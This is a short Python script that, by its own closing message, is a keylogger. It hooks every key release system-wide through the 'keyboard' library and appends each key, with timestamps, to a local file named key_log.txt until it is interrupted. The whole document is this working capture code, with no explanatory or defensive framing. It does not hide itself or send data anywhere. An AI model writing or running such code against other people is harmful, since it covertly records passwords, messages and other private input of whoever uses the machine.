import keyboard
import time

def log_keystroke(event):
    timestamp = time.time()
    milliseconds = int((timestamp - int(timestamp)) * 1000)
    key = event.name
    if len(key) > 1:
        if key == 'space':
            key = ' '
        elif key == 'enter':
            key = '\n'
        else:
            key = f'[{key}]'
    with open('key_log.txt', 'a') as f:
        f.write(f'{timestamp:.6f} {milliseconds:03d} {key}\n')

keyboard.on_release(log_keystroke)

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print('Keylogger stopped.')